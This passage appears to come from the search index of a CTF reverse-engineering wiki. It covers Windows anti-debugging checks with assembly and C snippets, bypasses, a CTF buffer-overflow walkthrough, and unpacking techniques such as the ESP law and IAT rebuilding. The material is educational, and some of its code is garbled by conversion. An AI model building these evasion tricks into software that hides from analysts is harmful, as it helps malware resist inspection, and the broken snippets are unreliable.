<code>0x7ffe026c</code> in 2G user space) (this value can be obtained on all 32-bit/64-bit versions of Windows), you can further confuse The <code>GetVersion()</code> function call operation of <code>kernel32</code>.</p>"},{"location":"reverse/windows/anti-debug/heap-flags/#detecting-forgeflags-field","title":"Detecting ForgeFlags field","text":"<p>Of course, another method is to detect the <code>ForgeFlags</code> field. The following is a 32-bit code detection for a 32-bit Windows environment. The <code>subsystem</code> version is between <code>3.10-3.50</code>:</p> <pre><code>call GetVersion\n\ncmp al, 6\ncc\nsbb ebx, ebx\n\nand ebx, 34h\n\nmov eax, fs:[30h] ;Process Environment Block\n\nmov eax, [eax+18h] ;get process heap base\n\nmov eax, [eax+ebx+10h] ;ForceFlags\n\n;not HEAP_CREATE_ALIGN_16\n\nbtr eax, 10h\n;HEAP_TAIL_CHECKING_ENABLED\n\n;+ HEAP_FREE_CHECKING_ENABLED\n\n;+ HEAP_VALIDATE_PARAMETERS_ENABLED\n\ncmp eax, 40000060h\n\nje being_debugged\n</code></pre> <p>The 32-bit code detects the 32-bit windows environment, and the <code>subsystem</code> is <code>3.51</code> and higher:</p> <pre><code>call GetVersion\n\ncmp al, 6\ncc\nsbb ebx, ebx\n\nand ebx, 34h\n\nmov eax, fs:[30h] ;Process Environment Block\n\nmov eax, [eax+18h] ;get process heap base\n\n;ForceFlags\n\n;HEAP_TAIL_CHECKING_ENABLED\n\n;+ HEAP_FREE_CHECKING_ENABLED\n\n;+ HEAP_VALIDATE_PARAMETERS_ENABLED\n\ncmp [eax+ebx+10h], 40000060h\n\nje being_debugged\n</code></pre> <p>64-bit code detects 64-bit windows environments (64-bit processes don't have to be bothered by the <code>subsystem</code> version):</p> <pre><code>push 60h\n\npop rsi\ngs:lodsq ;Process Environment Block\n\nmov ebx, [rax+30h] ;get process heap base\ncall GetVersion\n\ncmp al, 6\nas rax, rax\nand al, 0a4h\n\n;ForceFlags\n\n;HEAP_TAIL_CHECKING_ENABLED\n\n;+ HEAP_FREE_CHECKING_ENABLED\n\n;+ HEAP_VALIDATE_PARAMETERS_ENABLED\n\ncmp d [rbx+rax+74h], 40000060h\n\nje being_debugged\n</code></pre> <p>Detect 64-bit windows environment with 32-bit code:</p> <pre><code>call GetVersion\n\ncmp al, 6\npush 30h\n\npop eax\n\nmov ebx, fs:[eax] ;Process Environment Block\n\n;64-bit Process Environment Block\n\n;follows 32-bit Process Environment Block\n\nmov ah, 10h\n\nmov ebx, [ebx+eax] ;get process heap base\n\nsbb eax, eax\n\nand al, 0a4h\n\n;ForceFlags\n\n;HEAP_TAIL_CHECKING_ENABLED\n\n;+ HEAP_FREE_CHECKING_ENABLED\n\n;+ HEAP_VALIDATE_PARAMETERS_ENABLED\n\ncmp [ebx+eax+74h], 40000060h\n\nje being_debugged\n</code></pre>"},{"location":"reverse/windows/anti-debug/heap-flags/#reference-link","title":"Reference link","text":"<ul> <li>The \"Ultimate\" Anti-Debugging Reference</li> </ul>"},{"location":"reverse/windows/anti-debug/int-3/","title":"Interrupt 3","text":"<p>Whenever a software interrupt exception is triggered, the exception address and the value of the EIP register will point to the next instruction that generated the exception. But the breakpoint exception is one of the special cases.</p> <p>When the <code>EXCEPTION_BREAKPOINT(0x80000003)</code> exception is triggered, Windows will assume that this is caused by a single-byte \"<code>CC</code>\" opcode (that is, the <code>Int 3</code> instruction). Windows decrements the exception address to point to the asserted \" <code>CC</code>\" opcode, then pass the exception to the exception handler. But the value of the EIP register does not change.</p> <p>Therefore, if <code>CD 03</code> is used (this is the machine code representation of <code>Int 03</code>), then when the exception handling handle accepts control, the exception address is the location pointing to <code>03</code>.</p>"},{"location":"reverse/windows/anti-debug/isdebuggerpresent/","title":"IsDebuggerPresent","text":""},{"location":"reverse/windows/anti-debug/isdebuggerpresent/#about-isdebuggerpresent","title":"About IsDebuggerPresent","text":"<p>When the debugger exists, the <code>IsDebuggerPresent()</code> function of <code>kernel32</code> returns a <code>non-zero value</code>.</p> <pre><code>BOOL WINAPI IsDebuggerPresent(void);\n</code></pre>"},{"location":"reverse/windows/anti-debug/isdebuggerpresent/#detection-code","title":"Detection code","text":"<p>Its detection method is very simple, such as using the following code (32 or 64 bits are the same code) to detect in a 32-bit/64-bit environment:</p> <p><code>`</code>asm call IsDebuggerPresent</p> <p>test al, al jne being_debugged</p> <pre><code>In fact, this function simply returns the value of the `BeingDebugged` flag. The method of checking the `BeingDebugged` flag can also be implemented by examining the 32-bit environment with the following 32-bit code:\n\n\n`` `asm\nmov eax, fs:[30h] ;Process Environment Block\n\ncmp b [eax+2], 0 ;check BeingDebugged\n\njne being_debugged\n</code></pre> <p>Or use 64-bit code to detect 64-bit environments</p> <p><code>`</code>asm push 60h</p> <p>pop rsi gs:lodsq ;Process Environment Block</p> <p>cmp b [rax+2], 0 ;check BeingDebugged</p> <p>jne being_debugged</p> <pre><code>Or use a 32-bit code to detect a 64-bit environment\n\n\n`` `asm\nmov eax, fs:[30h] ;Process Environment Block\n\n;64-bit Process Environment Block\n\n;follows 32-bit Process Environment Block\n\ncmp b [eax+1002h], 0 ;check BeingDebugged\n\njne being_debugged\n</code></pre>"},{"location":"reverse/windows/anti-debug/isdebuggerpresent/#how-to-bypass","title":"How to bypass","text":"<p>To overcome these tests, just set the <code>BeingDebugged</code> flag to <code>0</code> (or change the return value).</p>"},{"location":"reverse/windows/anti-debug/junk-code/","title":"Flower command","text":""},{"location":"reverse/windows/anti-debug/junk-code/#principle","title":"Principle","text":"<p>A flower instruction is a way to hide a block of code (or other function) that you don't want to be reverse engineered. Inserting some junk code in the real code also ensures proper execution of the original program, and the program cannot decompile well. It is difficult to understand the content of the program and achieve the effect of confusing audiovisual.</p>"},{"location":"reverse/windows/anti-debug/junk-code/#example","title":"Example","text":"<p>Here is the second question of `See Snow.TSRC 2017CTF Fall Season'. The title download link: ctf2017_Fpc.exe</p> <p>The program writes several functions to confuse the audio and visual, and the key verification logic is added to prevent the static analysis of IDA. We use IDA to open the Fpc, the program will first print some prompt information, and then get the user's input.</p> <p></p> <p>Here we use the unsafe <code>scanf</code> function, the user input buffer is only <code>0xCh</code> long, we double-click <code>v1</code> to enter the stack frame view</p> <p></p> <p>Therefore, we can overwrite the return address by overflowing the data, and then transfer to any address to continue execution.</p> <p>Here I need to explain, that is, several confusing functions written before <code>scanf</code> are simple equations but actually have no solution. The program confuses the real verification logic, which makes IDA not very good. Decompilation. So the idea of our problem is to continue execution by overflowing to the real verification code.</p> <p>We can find the following data blocks not far from the code during analysis.</p> <p></p> <p>Because IDA does not recognize the data well, we can move the cursor to the beginning of the data block and then press the <code>C</code> key to disassemble the data into code.</p> <p></p> <p>It is worth noting that the location of this code is <code>0x00413131</code>, <code>0x41</code> is the 'ci' code of <code>&amp;#39;A&amp;#39;</code>, and <code>0x31</code> is the ascii code of <code>&amp;#39;1&amp;#39;</code>. Due to restrictions on snow games, users The input can only be letters and numbers, so we can also use the overflow vulnerability to execute this code.</p> <p>Open with OD, then set Ctrl+G<code>to reach the breakpoint of</code>0x413131<code>. After running, enter</code>12345612345611A<code>to enter, the program successfully reaches</code>0x00413131<code>. Then</code>right-click analysis-&gt;delete analysis from the module. Identify the correct code</p> <p></p> <p>After breaking at <code>0x413131</code>, click on the \"\"View\" in the menu bar, select <code>&amp;quot;RUN Track&amp;quot;</code>, then click on \"\"Debug\"<code>, select</code>\"Track Step\", and the program will record this flower. The process of instruction execution is as follows:</p> <p></p> <p>This flower instruction is very long, but after using the OD tracking function, the execution flow of the flower instruction is very clear. A lot of jumps are made in the whole process, we just take the effective instructions and analyze it.</p> <p>It should be noted that in the effective instruction, we still have to satisfy some conditional jumps, so that the program can continue to execute on the correct logic.</p> <p>For example, <code>jnz ctf2017_.00413B03</code> at <code>0x413420</code>. We are going to come back again, and set a breakpoint at <code>0x413420</code></p> <p></p> <p>The jump is satisfied by modifying the flag register. Continue to follow the step (after the '0041362E jnz ctf2017_.00413B03' needs to be satisfied). After the logic is correct, take the valid instruction and continue the analysis.</p> <p></p>"},{"location":"reverse/windows/anti-debug/ntglobalflag/","title":"NtGlobalFlag","text":""},{"location":"reverse/windows/anti-debug/ntglobalflag/#about-ntglobalflag","title":"About NtGlobalFlag","text":"<p>On 32-bit machines, the <code>NtGlobalFlag</code> field is located at the offset of <code>PEB</code> (process environment block) <code>0x68</code>, and the 64-bit machine is at offset '0xBC`. The default value for this field is 0. When debugging This field is set to a specific value while the device is running. Although this value does not quite indicate that a debugger is actually running, this field is often used for this purpose.</p> <p>This field contains a series of flag bits. The process created by the debugger sets the following flags:</p> <pre><code>FLG_HEAP_ENABLE_TAIL_CHECK (0x10)\n\nFLG_HEAP_ENABLE_FREE_CHECK (0x20)\n\nFLG_HEAP_VALIDATE_PARAMETERS (0x40)\n</code></pre>"},{"location":"reverse/windows/anti-debug/ntglobalflag/#detection-code","title":"Detection code","text":"<p>Therefore, you can check these flags to detect the presence of the debugger. For example, use the 32-bit code below to detect on a 32-bit machine:</p> <p><code>`</code>asm mov eax, fs:[30h] ;Process Environment Block</p> <p>mov al, [eax+68h] ;NtGlobalFlag</p> <p>and al, 70h cmp al, 70h je being_debugged</p> <pre><code>The following is the detection code for 64-bit code on a 64-bit machine:\n\n\n`` `asm\npush 60h\n\npop rsi\ngs:lodsq                ;Process Environment Block\n\nmov al, [rsi*2+rax-14h] ;NtGlobalFlag\n\nand al, 70h\ncmp al, 70h\nje being_debugged\n</code></pre> <p>It should be noted that if a 32-bit program is running on a 64-bit machine, there will actually be two PEBs: one is a 32-bit part and the other is a 64-bit. The corresponding field of the 64-bit PEB will also look like Changed in 32-bit.</p> <p>So we have the following, using a 32-bit code to detect the 64-bit machine environment:</p> <pre><code>mov eax, fs:[30h] ; Process Environment Block\n\n;64-bit Process Environment Block\n\n;follows 32-bit Process Environment Block\n\nmov al, [eax+10bch] ;NtGlobalFlag\n\nand al, 70h\ncmp al, 70h\nje being_debugged\n</code></pre> <p>Remember not to compare directly without masking other bits, so you won't be able to detect the debugger.</p> <p>In <code>ExeCryptor</code>, the <code>NtGlobalFlag</code> is used to detect the debugger, but the three flags of <code>NtGlobalFlag</code> are only when the program is <code>created by the debugger</code> instead of the process attached by the debugger. Will be set.</p>"},{"location":"reverse/windows/anti-debug/ntglobalflag/#change-the-initial-value-of-ntglobalflag","title":"Change the initial value of NtGlobalFlag","text":"<p>Of course, the way to bypass this detection is also very simple, that is, the debugger wants to reset the field to 0. However, this default initial value can be changed in any of the following four ways:</p> <ol> <li> <p>The value of <code>GlobalFlag</code> of the registry <code>HKLM\\System\\CurrentControlSet\\Control\\SessionManager</code> will be replaced by the <code>NtGlobalFlag</code> field. Although it may be changed by Windows (described below), the registry key will be on the system. All processes in the process have an impact and take effect after the restart.</p> <p></p> </li> </ol> <p>Of course, this also produces another way to detect the debugger: If a debugger copies the key values in the registry to the <code>NtGlobalFlag</code> field in order to hide itself, the key values in the registry have been replaced beforehand and have not yet been The restart takes effect. Then the debugger just copies a fake value, not the one that is really needed. If the program knows the real value instead of the fake value in the registry, then the debugger can be detected.</p> <p>Of course, the debugger can also run other processes and then query the <code>NtGlobalFlag</code> field to get the real value.</p> <ol> <li>It is still <code>GlobalFlag</code>, but here is <code>HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\ &lt;filename&gt;</code>. (Image hijacking), here you need to  <code>Replace the file name of the executable file that needs to be changed (no need to specify the path). After setting</code>GlobalFlag<code>, the system will overwrite its value to the</code>NtGlobalFlag` field (only covered for the specified process). Can be changed again by Windows (see below). <li>Load two fields in the configuration table (<code>Load Configuration Table</code>): <code>GlobalFlagsClear</code> and <code>GlobalFlagsSet</code>.</li> <p><code>GlobalFlagsClear</code> lists the flags that need to be cleared, and <code>GlobalFlagsSet</code> lists the flags that need to be set. These settings will take effect after the <code>GlobalFlag</code> application, so it can override the value specified by <code>GlobalFlag</code>. However it Cannot override the flag set by Windows. For example, setting <code>FLG_USER_STACK_TRACE_DB (0x1000)</code> allows Windows to set the <code>FLG_HEAP_VALIDATE_PARAMETERS (0x40)</code> flag, even if <code>FLG_HEAP_VALIDATE_PARAMETERS</code> is cleared in the load configuration table (<code>Load Configuration Table</code>). Windows will also be reset during subsequent process loading.</p> <ol> <li>When the debugger creates a process, Windows will make some changes. By setting <code>_NO_DEBUG_HEAP</code> in the environment variable, <code>NtGlobalFlag</code> will not set the flags of the 3 heaps because of the debugger. Of course they are still You can continue to set it by <code>GlobalFlag</code> or by loading <code>GlobalFlagsSet</code> in the configuration table.</li> </ol>"},{"location":"reverse/windows/anti-debug/ntglobalflag/#how-to-bypass-detection","title":"How to bypass detection?","text":"<p>There are 3 ways to bypass the detection of <code>NtGlobalFlag</code></p> <ul> <li>Manually modify the value of the flag bit (<code>FLG_HEAP_ENABLE_TAIL_CHECK</code>, <code>FLG_HEAP_ENABLE_FREE_CHECK</code>, <code>FLG_HEAP_VALIDATE_PARAMETERS</code>)</li> <li>Use the <code>hide-debug</code> plugin in Ollydbg</li> <li>Start the program in the way that Windbg disables the debug heap (<code>windbg -hd program.exe</code>)</li> </ul>"},{"location":"reverse/windows/anti-debug/ntglobalflag/#manual-bypass-example","title":"Manual bypass example","text":"<p>The following is an example that demonstrates how to manually bypass detection.</p> <p><code>`</code>asm .text:00403594     64 A1 30 00 00 00          mov     eax, large fs:30h   ; PEB struct loaded into EAX</p> <p>.text:0040359A                                db      3Eh                 ; IDA Pro display error (the byte is actually used in the next instruction)</p> <p>.text:0040359A     3E 8B 40 68                mov     eax, [eax+68h]      ; NtGlobalFlag (offset 0x68 relative to PEB) saved to EAX</p> <p>.text:0040359E     83 E8 70                   sub     eax, 70h            ; Value 0x70 corresponds to all flags on (FLG_HEAP_ENABLE_TAIL_CHECK, FLG_HEAP_ENABLE_FREE_CHECK, FLG_HEAP_VALIDATE_PARAMETERS)</p> <p>.text:004035A1     89 85 D8 E7 FF FF          mov     [ebp+var_1828], eax</p> <p>.text:004035A7     83 BD D8 E7 FF FF 00       cmp     [ebp+var_1828], 0   ; Check whether 3 debug flags were on (result of substraction should be 0 if debugged)</p> <p>.text:004035AE     75 05                      jnz     short loc_4035B5    ; No debugger, program continues...</p> <p>.text:004035B0     E8 4B DA FF FF             call    s_selfDelete        ; ...else, malware deleted</p> <p>```</p> <p>Set the breakpoint in offset <code>0x40359A</code> in Ollydbg, run the program to trigger the breakpoint. Then open the <code>CommandLine</code> plugin with <code>dump fs:[30]+0x68</code>dump out the contents of <code>NtGlobalFlag</code></p> <p></p> <p>Right-click <code>Binary-&amp;gt;Fill with 00&amp;#39;s</code> and replace the value <code>0x70</code> with <code>0x00</code>.</p>"},{"location":"reverse/windows/anti-debug/ntglobalflag/#reference-link","title":"Reference link","text":"<ul> <li> <p>The \"Ultimate\" Anti-Debugging Reference</p> </li> <li> <p>PEB-Process-Environment-Block/NtGlobalFlag</p> </li> </ul>"},{"location":"reverse/windows/anti-debug/ntqueryinformationprocess/","title":"NtQueryInformationProcess","text":"<pre><code>NTSTATUS WINAPI NtQueryInformationProcess(\n\n  _In_      HANDLE           ProcessHandle,\n\n  _In_      PROCESSINFOCLASS ProcessInformationClass,\n\n  _Out_     PVOID            ProcessInformation,\n\n  _In_      ULONG            ProcessInformationLength,\n\n_Out_opt_ MEMBER OF ReturnLength\n);\n</code></pre>"},{"location":"reverse/windows/anti-debug/ntqueryinformationprocess/#processdebugport","title":"ProcessDebugPort","text":"<p>The undocumented <code>ntdll</code> <code>NtQueryInformationProcess()</code> function accepts an information class parameter for query. <code>ProcessDebugPort(7)</code> is one of the information classes. <code>kernel32``CheckRemoteDebuggerPresent()</code> function is called internally. NtQueryInformationProcess()<code>is used to detect debugging, while</code>NtQueryInformationProcess<code>internally queries the</code>DebugPort<code>field of the</code>EPROCESS<code>structure. When the process is being debugged, the return value is</code>0xffffffff`.</p> <p>It can be detected in a 32-bit environment with the following 32-bit code:</p> <p><code>`</code>asm push eax</p> <p>mov eax, esp</p> <p>push 0</p> <p>push 4 ;ProcessInformationLength</p> <p>push eax</p> <p>push 7 ;ProcessDebugPort</p> <p>push -1 ;GetCurrentProcess()</p> <p>call NtQueryInformationProcess</p> <p>pop eax</p> <p>inc eax</p> <p>je being_debugged</p> <pre><code>Detect in a 64-bit environment with the following 64-bit code:\n\n\n`` `asm\nxor ebp, ebp\n\nenter 20h, 0\n\npush 8 ;ProcessInformationLength\n\npop r9\n\npush rbp\n\npop r8\n\npush 7 ;ProcessDebugPort\n\npop rdx\n\nor rcx, -1 ;GetCurrentProcess()\n\ncall NtQueryInformationProcess\n\nleave\n\ntest ebp, ebp\n\njne being_debugged\n</code></pre> <p>Since the information is passed from the kernel, there is no easy way to prevent the function from detecting the debugger in user mode.</p>"},{"location":"reverse/windows/anti-debug/ntqueryinformationprocess/#processdebugobjecthandle","title":"ProcessDebugObjectHandle","text":"<p>Windows XP introduces the <code>debug object</code>. When a debug session starts, it creates a <code>debug</code> object and a handle associated with it. We can use the <code>ProcessDebugObjectHandle (0x1e)</code> class to query the value of this handle.</p> <p>It can be detected in a 32-bit environment with the following 32-bit code:</p> <p><code>`</code>asm push 0</p> <p>mov eax, esp</p> <p>push 0</p> <p>push 4 ;ProcessInformationLength</p> <p>push eax</p> <p>push 1eh ;ProcessDebugObjectHandle</p> <p>push -1 ;GetCurrentProcess()</p> <p>call NtQueryInformationProcess</p> <p>pop eax</p> <p>test eax, eax</p> <p>jne being_debugged</p> <pre><code>Detect in a 64-bit environment with the following 64-bit code:\n\n\n`` `asm\nxor ebp, ebp\n\nenter 20h, 0\n\npush 8 ;ProcessInformationLength\n\npop r9\n\npush rbp\n\npop r8\n\npush 1eh ;ProcessDebugObjectHandle\n\npop rdx\n\nor rcx, -1 ;GetCurrentProcess()\n\ncall NtQueryInformationProcess\n\nleave\n\ntest ebp, ebp\n\njne being_debugged\n</code></pre>"},{"location":"reverse/windows/anti-debug/ntqueryinformationprocess/#processdebugflags","title":"ProcessDebugFlags","text":"<p>The <code>ProcessDebugFlags (0x1f)</code> class returns the opposite of <code>NoDebugInherit</code> of the <code>EPROCESS</code> structure. This means that when the debugger exists, the return value is <code>0</code>, and when it does not exist, it returns <code>1</code>.</p> <p>It can be detected in a 32-bit environment with the following 32-bit code:</p> <p><code>`</code>asm push eax</p> <p>mov eax, esp</p> <p>push 0</p> <p>push 4 ;ProcessInformationLength</p> <p>push eax</p> <p>push 1fh ;ProcessDebugFlags</p> <p>push -1 ;GetCurrentProcess()</p> <p>call NtQueryInformationProcess</p> <p>pop eax</p> <p>test eax, eax</p> <p>je being_debugged</p> <pre><code>Detect in a 64-bit environment with the following 64-bit code:\n\n\n`` `asm\nxor ebp, ebp\n\nenter 20h, 0\n\npush 4 ;ProcessInformationLength\n\npop r9\n\npush rbp\n\npop r8\n\npush 1fh ;ProcessDebugFlags\n\npop rdx\n\nor rcx, -1 ;GetCurrentProcess()\n\ncall NtQueryInformationProcess\n\nleave\n\ntest ebp, ebp\n\nje being_debugged\n</code></pre>"},{"location":"reverse/windows/anti-debug/the-heap/","title":"The Heap","text":"<p>When the heap is initialized, it will check <code>heap flags</code> and make additional changes to the environment depending on the presence or absence of some flags. Like <code>Themida</code>, this method is used to detect the debugger.</p> <p>such as:</p> <ul> <li>If the <code>HEAP_TAIL_CHECKING_ENABLED</code> flag is set (see the <code>Heap Flags</code> section), then in the 32-bit windows, 2 <code>0xABABABAB</code> will be appended to the end of the allocated heap block (the 64-bit environment is 4).</li> <li>If the <code>HEAP_FREE_CHECKING_ENABLED</code> (see the <code>Heap Flags</code> section) flag is set, then when extra bytes are needed to fill the end of the heap block, it will be filled with <code>0xFEEEFEEE</code> (or part)</li> </ul> <p>So, a new way to detect the debugger is to check these values.</p>"},{"location":"reverse/windows/anti-debug/the-heap/#heap-pointer-is-known","title":"heap pointer is known","text":"<p>If a heap pointer is known, then we can directly check the data in the heap. However, in Windows Vista and later, the heap protection mechanism (both 32-bit/64-bit) is used, using an XOR. The key is used to encrypt the heap size. Although you can choose whether to use the key, but the default is used. And the location of the heap header, in <code>Windows NT/2000/XP</code> and <code>Windows Vista and higher.</code>There is also a difference between them. So we also need to take the <code>Windows version</code> into account.</p> <p>The following 32-bit code can be used to detect a 32-bit environment:</p> <p><code>`</code>asm     xor ebx, ebx</p> <pre><code>call GetVersion\n</code></pre> <p>cmp al, 6     sbb ebp, ebp</p> <pre><code>jb l1\n\n;Process Environment Block\n\nmov eax, fs:[ebx+30h]\n\nmov eax, [eax+18h] ;get process heap base\n\nmov ecx, [eax+24h] ;check for protected heap\n\njecxz l1\n</code></pre> <p>mov ecx, [ecx]     test [eax+4ch], ecx</p> <pre><code>cmovne ebx, [eax+50h] ;conditionally get heap key\n</code></pre> <p>l1: mov eax,  <pre><code>movzx edx, w [eax-8] ;size\n\nxor dx, bx\n\nmovzx ecx, b [eax+ebp-1] ;overhead\n</code></pre> <p>under it, ecx     lea edi, [edx*8+eax]</p> <p>mov al, 0abh     mov cl, 8</p> <p>Repe scasb     je being_debugged</p> <pre><code>Or use the following 64-bit code to detect a 64-bit environment:\n</code></pre> <pre><code>xor ebx, ebx\n\ncall GetVersion\n</code></pre> <p>cmp al, 6 sbb rbp, rbp     jb l1</p> <pre><code>;Process Environment Block\n\nmov rax, gs:[rbx+60h]\n\nmov eax, [rax+30h] ;get process heap base\n\nmov ecx, [rax+40h] ;check for protected heap\n</code></pre> <p>jrcxz l1 mov ecx, [RCX + 8] test [rax + 7ch], ecx     cmovne ebx, [rax+88h] ;conditionally get heap key</p> <p>l1: mov eax,  <pre><code>movzx edx, w [rax-8] ;size\n\nxor dx, bx\n\nadd edx, edx\n\nmovzx ecx, b [rax+rbp-1] ;overhead\n</code></pre> <p>under it, ecx Lea, [rdx * 8 + rax] mov al, 0abh     mov cl, 10h</p> <p>Repe scasb     je being_debugged</p> <pre><code>There is no example of using a 32-bit code to detect a 64-bit environment, since a 64-bit heap cannot be parsed by a 32-bit heap function.\n\n\n\n\n## heap pointer unknown\n\n\nIf we don&amp;#39;t know the heap pointer, we can use the `HenelWalk()` function of `kernel32` or the `RtlWalkHeap()` function of `ntdll` (or even the `GetCommandLine()` function of `kernel32`). The returned heap The size value will be automatically decrypted, so you don&amp;#39;t need to care about the version of windows anymore.\n\n\nThe following 32-bit code can be used to detect a 32-bit environment:\n\n\n`` `asm\n    mov ebx, offset l2\n\n    ;get a pointer to a heap block\n\nl1: push ebx\n\n    mov eax, fs:[30h] ;Process Environment Block\n\n    push d [eax+18h] ;save process heap base\n\n    call HeapWalk\n\n    cmp w [ebx+0ah], 4 ;find allocated block\n\njne l1\n    mov edi, [ebx] ;data pointer\n\n    add edi, [ebx+4] ;data size\n\nmov al, 0abh\n    push 8\n\npop ecx\nRepe scasb\n    je being_debugged\n\n    ...\n\nl2: db 1ch dup (0) ;sizeof(PROCESS_HEAP_ENTRY)\n</code></pre> <p>Or use the following 64-bit code to detect a 64-bit environment:</p> <p><code>`</code>asm mov rbx, offset l2     ;get a pointer to a heap block</p> <p>l1: push rbx</p> <pre><code>pop rdx\n\npush 60h\n</code></pre> <p>pop rsi     gs:lodsq ;Process Environment Block</p> <pre><code>;get a pointer to process heap base\n</code></pre> <p>mov ecx, [rax + 30h]     call HeapWalk</p> <pre><code>cmp w [rbx+0eh], 4 ;find allocated block\n</code></pre> <p>jne l1     mov edi, [rbx] ;data pointer</p> <pre><code>add edi, [rbx+8] ;data size\n</code></pre> <p>mov al, 0abh     push 10h</p> <pre><code>pop rcx\n</code></pre> <p>Repe scasb     je being_debugged</p> <pre><code>...\n</code></pre> <p>l2: db 28h dup (0) ;sizeof(PROCESS_HEAP_ENTRY)</p> <p>```</p> <p>There is no example of using a 32-bit code to detect a 64-bit environment, since a 64-bit heap cannot be parsed by a 32-bit heap function.</p>"},{"location":"reverse/windows/anti-debug/thread_local_storage/","title":"Thread Local Storage(TLS)","text":"<p>Thread Local Storage (TLS) is used to initialize specific thread data before the thread starts, because each process contains at least 1 thread, which initializes the data before the main thread runs. Initialization can be done by specifying a copy that has been copied to dynamically allocated memory. The static buffer in the middle, and / or by executing the code in the callback function array to initialize the dynamic memory content. Often caused by the abuse of the callback function array.</p> <p>At runtime, the contents of the TLS callback function array can be modified or added. The newly added or newly modified callback function will be called with the new address. There is no limit to the number of callback functions. The expansion of the array can be done with the following code:</p> <p><code>`</code>asm l1: mov d [offset cbEnd], offset l2</p> <p>right l2: ... ```</p> <p>When the callback at l1 returns, it will continue to call the callback function of l2.</p> <p>todo: continue to finish it</p>"},{"location":"reverse/windows/anti-debug/zwsetinformationthread/","title":"ZwSetInformationThread","text":""},{"location":"reverse/windows/anti-debug/zwsetinformationthread/#about-zwsetinformationthread","title":"About ZwSetInformationThread","text":"<p>ZwSetInformationThread is same as NtSetInformationThread. By setting the ThreadHideFromDebugger for a thread, you can disable the thread from generating debugging events. The code is as follows <pre><code>#include &lt;Windows.h&gt;\n#include &lt;stdio.h&gt;\n\ntypedef DWORD(WINAPI* ZW_SET_INFORMATION_THREAD) (HANDLE, DWORD, PVOID, ULONG);\n#define ThreadHideFromDebugger 0x11\nVOID DisableDebugEvent(VOID)\n{\n    HINSTANCE hModule;\n    ZW_SET_INFORMATION_THREAD ZwSetInformationThread;\n    hModule = GetModuleHandleA(\"Ntdll\");\n    ZwSetInformationThread = (ZW_SET_INFORMATION_THREAD)GetProcAddress(hModule, \"ZwSetInformationThread\");\n    ZwSetInformationThread(GetCurrentThread(), ThreadHideFromDebugger, 0, 0);\n}\n\nint main()\n{\n    printf(\"Begin\\n\");\n    DisableDebugEvent();\n    printf(\"End\\n\");\n    return 0;\n}\n</code></pre></p> <p>The key code is <code>ZwSetInformationThread(GetCurrentThread(), ThreadHideFromDebugger, 0, 0);</code>. If it is in debugging state, the program will exit after executing this line of code.  </p>"},{"location":"reverse/windows/anti-debug/zwsetinformationthread/#how-to-bypass","title":"How to bypass","text":"<p>Note that the second parameter of the ZwSetInformationThread function is ThreadHideFromDebugger, which value is 0x11. When debugging the function and the second parameter value is 0x11, skip the function or change 0x11 to other value.  </p>"},{"location":"reverse/windows/unpack/direct-oep/","title":"One Step to the OEP Method","text":"<p>The so-called one-step OEP shelling method is based on the characteristics of the shelling, looking for the assembly instruction closest to OEP, then the int3 breakpoint, and the dump program when the program goes to OEP.</p> <p>For example, some compression shells tend to be particularly close to OEP or large jmp. Therefore, using Ollydbg's search function, you can search the shell's feature assembly code to achieve the effect of one step breakpoint to OEP.</p>"},{"location":"reverse/windows/unpack/direct-oep/#_1","title":"\u8981\u70b9","text":"<ol> <li>ctrl+f find popad</li> <li>ctrl+l jumps to the next match</li> <li>Find the match, confirm that the shell is ready to jump to the OEP part, then set the breakpoint to run there.</li> <li>Only for a very small number of compression shells</li> </ol>"},{"location":"reverse/windows/unpack/direct-oep/#example","title":"example","text":"<p>The sample program can be downloaded here: 3_direct2oep.zip</p> <p>Still use the original notepad.exe to illustrate, after opening with <code>Ollydbg</code>, we press <code>ctrl+f</code> to find the specified string, like <code>popad</code> is a typical feature, some shells are commonly used. Popad<code>to restore state, so search for</code>popad` as shown below.</p> <p></p> <p>In this example, when the searched 'popad<code>does not meet our requirements, you can press</code>ctrl+l` to search for the next match, about three or four times, we found a jump to OEP. Location.</p> <p></p>"},{"location":"reverse/windows/unpack/esp/","title":"ESP Law","text":"<p>ESP law is a weapon for shelling, and it is one of the most frequently used methods for shelling.</p>"},{"location":"reverse/windows/unpack/esp/#_1","title":"\u8981\u70b9","text":"<p>The principle of ESP law is to use the stack balance in the program to quickly find OEP.</p> <p>Because in the process of self-decryption or self-extraction, many shells will first push the current register state, such as using <code>pushad</code>, after the decompression ends, the previous register values will be popped, such as using <code>popad</code>. When the register is popped, the program code is often restored, and the hardware breakpoint is triggered. Then at the current position of the program, it is easy to reach the correct OEP position with only a few single steps.</p> <ol> <li>The program just loaded and started pushad/pushfd</li> <li>Set all the registers to the ESP register and set the hardware breakpoint.</li> <li>Run the program, trigger a breakpoint</li> <li>Remove hardware breakpoints and start analyzing</li> </ol>"},{"location":"reverse/windows/unpack/esp/#example","title":"example","text":"<p>The sample program can be downloaded here: 2_esp.zip</p> <p>As the example in the previous article, enter a sentence <code>popad</code>, we press F8 to execute <code>popad</code> to save the register state. We can find in the register window on the right that the value of the <code>ESP</code> register has changed to red, that is, the value has changed. .</p> <p></p> <p>We right click on the value of the <code>ESP</code> register, which is <code>0019FF64</code> in the figure. After selecting <code>HW break[ESP]</code>, press <code>F9</code> to run the program, and the program will break when the breakpoint is triggered. Came to the position of <code>0040D3B0</code>. Here is the position we arrived in the single step tracking, the rest will not go into details.</p> <p></p>"},{"location":"reverse/windows/unpack/fix-iat/","title":"DUMP and IAT Reconstruction","text":""},{"location":"reverse/windows/unpack/fix-iat/#principle","title":"Principle","text":"<p>After finding the program OEP, we need to dump the program and rebuild the <code>IAT</code>. <code>IAT</code> full name is <code>Import Address Table</code>, the entry points to the actual address of the function.</p>"},{"location":"reverse/windows/unpack/fix-iat/#example","title":"example","text":"<p>For example, as follows, we found OEP and reached the real entry point of the program. We need to dump the program. Right click, select <code>&amp;quot;Use OllyDump to unpack the debugging process&amp;quot; (but you can also use</code>LoadPE`) Dump out):</p> <p></p> <p>A window pops up to see if the address is correct. The main thing is to check if the 'entry point address' has been selected. Then uncheck the 'Rebuild Input Table'.</p> <p></p> <p>Name the dump file, I am named <code>dump.exe</code> here. Let's try to run <code>dump.exe</code>, we can find that the program can't run normally. For some simple shells, you dump it and it doesn't work. If you do find the correct OEP and use 'IDA<code>to decompile and see the results well, then your first thought should be that the program &amp;#39;IAT</code> has a problem. You need to rebuild <code>IAT</code>.</p> <p>We need to use <code>ImportREC</code> to help fix the input table.</p> <p>Open <code>ImportREC</code>, select a running process <code>original .exe</code> 